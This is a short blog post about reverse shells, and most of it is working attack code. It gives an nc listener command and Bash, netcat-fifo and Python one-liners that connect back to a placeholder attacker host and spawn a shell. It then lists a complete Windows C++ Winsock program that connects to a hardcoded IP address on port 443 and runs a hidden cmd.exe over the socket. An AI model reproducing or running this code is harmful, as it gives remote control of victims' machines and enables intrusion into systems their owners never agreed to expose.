---
title: "Simple Reverse Shell with C++"
date: 2024-08-26 08:00:00 - 0500
categories: [Blogs, Knowledge]
tags: [c++, reverse shell, winsock2]
image: 
  path: /assets/img/posts/2024/reverse shell.jpg
---

 
## What is Reverse Shell? 

Reverse shell or often called connect-back shell is remote shell introduced from the target by connecting back to the attacker machine and spawning target shell on the attacker machine. This usually used during exploitation process to gain control of  the remote machine. 

![Reverse shell diagram](/assets/img/posts/2024/Rev Diagram.png){: width="972" height="589" }

A reverse shell is commonly used to bypass firewall restrictions that block incoming connections.

The target machine has a firewall that blocks incoming connections on most ports, but it may allow outbound connection. 

There is one more caveat. In real cyber attacks, the reverse shell can also be obtained through social engineering, for example, a piece of malware installed on a local workstation via a phishing email or a malicious website might initiate an outgoing connection to a command server and provide hackers with a reverse shell capability.

## Simple Reverse Shell 

First, set up a listener on your server. For simplicity, in this example, the victim allows outgoing connections on any port. In this case, use `9001` as the listener port. 

The listener can be any program or utility capable  of opening TCP/UDP connections or sockets, `nc` or `netcat` can be used for this purpose.

```bash
nc -lnvp 9001
```
{: .nolineno }

```bash
bash -c 'sh -i >& /dev/tcp/<ip addr>/9001 0>&1'
```
{: .nolineno }

![Reverse shell example](assets/img/posts/2024/Rev example.png){: width="972" height="589" }

This is a simple reverse shell in Bash. You can create a reverse shell with a semi-interactive shell using Python, as well as with other languages such as C/C++, PHP, etc.

```bash
mkfifo /tmp/p; nc <LHOST> <LPORT> 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p
```
{: .nolineno }

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
{: .nolineno }


## Simple Reverse Shell with C++ for Windows

```c++
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif // !WIN32_LEAN_AND_MEAN
#include<Windows.h>
#include<WinSock2.h>
#include<WS2tcpip.h>
#include<stdio.h>

#pragma comment(lib, "Ws2_32.lib")

#define EXIT_SUCCESS 0
#define EXIT_FAILED 1 

int main()
{
	BYTE lowByte = 0x02; 
	BYTE highByte = 0x02; 
	WORD wVersionRequested = MAKEWORD(lowByte, highByte); 
	// Initialize winsock
	WSADATA wsaData; 
	int err = WSAStartup(wVersionRequested, &wsaData); 
	if (err != 0)
	{
#ifdef DEBUG
		printf("WSAStartup failed with error: %d\n", err); 
#endif // DEBUG
		return EXIT_FAILED; 
	}
	// Create socket
	SOCKET s = INVALID_SOCKET; 
	s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 
	if (s == INVALID_SOCKET)
	{
#ifdef DEBUG
		printf("WSASocket function failed with error: %ld\n", WSAGetLastError());
#endif // DEBUG
		return EXIT_FAILED;
	}
	struct sockaddr_in serverAdrdr; 
	ZeroMemory(&serverAdrdr, sizeof(serverAdrdr)); 
	serverAdrdr.sin_family = AF_INET; 
	serverAdrdr.sin_port = htons(443); 
	inet_pton(AF_INET, "107.20.10.75", &serverAdrdr.sin_addr);
	// Connect to server
	if (WSAConnect(s, (struct sockaddr*)&serverAdrdr, sizeof(serverAdrdr), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
	{
#ifdef DEBUG
		printf("Socket connection error: %ld\n", WSAGetLastError());
#endif // DEBUG
		closesocket(s);
		WSACleanup();
		return EXIT_FAILED;
	}

	// Create process
	char buffer[4096];
	STARTUPINFOA si{};
	PROCESS_INFORMATION pi{};
	while (true)
	{
		int receivedBytes = recv(s, buffer, sizeof(buffer), 0); 
		if (receivedBytes <= 0)
		{
#ifdef DEBUG
			printf("Connection closed.\n");
#endif // DEBUG
		}
		else
		{
#ifdef DEBUG
			printf("recv failed: %d\n", WSAGetLastError());
#endif // DEBUG
		}
		// Set up STARTUPINFO
		SecureZeroMemory(&si, sizeof(si));
		si.cb = sizeof(si); 
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; 
		si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
		si.wShowWindow = SW_HIDE;
		char kommand[] = "cmd.exe";
		if (!CreateProcessA(NULL, kommand, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
		{
#ifdef DEBUG
			printf("CreateProcess failed: %d\n", GetLastError()); 
#endif // DEBUG
			break;
		}
		WaitForSingleObject(pi.hProcess, INFINITE);
		CloseHandle(pi.hProcess); 
		CloseHandle(pi.hThread); 
	}
	closesocket(s);
	// Call WSACleanup when done using the winsock dll
	WSACleanup(); 
	return EXIT_SUCCESS;
}
```
{: .nolineno }

## References 

[1] - [Reverse Shell cheatsheet - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) <br>

[2] - [cocomelonc - Simple C++ reverse shell for windows](https://cocomelonc.github.io/tutorial/2021/09/15/simple-rev-c-1.html)